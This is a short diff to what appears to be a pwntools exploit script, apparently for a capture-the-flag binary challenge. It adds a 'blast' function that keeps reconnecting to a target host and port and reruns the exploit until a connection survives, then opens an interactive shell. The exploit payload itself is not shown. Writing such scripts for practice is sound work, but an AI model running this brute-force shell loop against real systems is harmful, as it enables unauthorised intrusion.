@@ -63,7 +63,19 @@ sa  = lambda a, b : cn.sendafter(a, b)
 def slog_show():
     for i in slog:
         success(i + ' ==> ' + hex(slog[i]))
+def blast(host, port):
+    while True:
+        cn = remote(host, port)
 
+        exp()
+        try:
+            cn.recv(timeout=1)
+        except EOFError:
+            cn.close()
+            continue
+        cn.interactive()
+
+        
 exp()
 
 slog_show()
